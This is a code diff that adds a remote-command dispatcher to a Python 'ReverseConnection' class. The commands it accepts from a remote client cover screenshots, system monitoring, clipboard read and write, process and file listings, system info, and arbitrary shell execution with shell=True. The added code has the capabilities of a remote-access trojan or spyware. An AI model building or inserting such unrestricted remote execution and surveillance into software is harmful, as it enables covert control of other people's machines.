@@ -174,5 +174,86 @@ class ReverseConnection:
     
     def _handle_command(self, command):
         """Handle commands from client"""
-        # Commands can be implemented here if needed
-        pass
+        try:
+            cmd_type = command.get('type')
+            cmd_data = command.get('data', {})
+            
+            if cmd_type == 'screenshot':
+                # Take a screenshot
+                from .screenshots import take_screenshot
+                take_screenshot()
+                print("✓ Screenshot taken via remote command")
+                
+            elif cmd_type == 'start_monitoring':
+                # Start system monitoring
+                from .monitoring import start_monitoring
+                start_monitoring()
+                print("✓ Monitoring started via remote command")
+                
+            elif cmd_type == 'stop_monitoring':
+                # Stop system monitoring
+                from .monitoring import stop_monitoring
+                stop_monitoring()
+                print("✓ Monitoring stopped via remote command")
+                
+            elif cmd_type == 'execute':
+                # Execute a system command
+                import subprocess
+                command_str = cmd_data.get('command')
+                if command_str:
+                    try:
+                        result = subprocess.run(
+                            command_str, 
+                            shell=True, 
+                            capture_output=True, 
+                            text=True, 
+                            timeout=30
+                        )
+                        print(f"✓ Executed command: {command_str}")
+                        print(f"Output: {result.stdout[:200]}...")
+                    except subprocess.TimeoutExpired:
+                        print(f"✗ Command timeout: {command_str}")
+                    except Exception as e:
+                        print(f"✗ Command execution failed: {e}")
+                        
+            elif cmd_type == 'clipboard_get':
+                # Get clipboard content
+                from .clipboard import get_clipboard_text
+                content = get_clipboard_text()
+                print(f"✓ Clipboard accessed via remote command")
+                
+            elif cmd_type == 'clipboard_set':
+                # Set clipboard content
+                from .clipboard import set_clipboard_text
+                content = cmd_data.get('content', '')
+                if content:
+                    set_clipboard_text(content)
+                    print(f"✓ Clipboard set via remote command")
+                    
+            elif cmd_type == 'process_list':
+                # Get process list
+                from .process_manager import get_processes
+                processes = get_processes()
+                print(f"✓ Process list requested via remote command ({len(processes)} processes)")
+                
+            elif cmd_type == 'file_list':
+                # List files in directory
+                import os
+                path = cmd_data.get('path', '.')
+                try:
+                    files = os.listdir(path)
+                    print(f"✓ File list requested for {path} ({len(files)} items)")
+                except Exception as e:
+                    print(f"✗ File list error: {e}")
+                    
+            elif cmd_type == 'system_info':
+                # Get system information
+                from .system_info import get_detailed_system_info
+                info = get_detailed_system_info()
+                print("✓ System info requested via remote command")
+                
+            else:
+                print(f"? Unknown command type: {cmd_type}")
+                
+        except Exception as e:
+            print(f"✗ Command handling error: {e}")
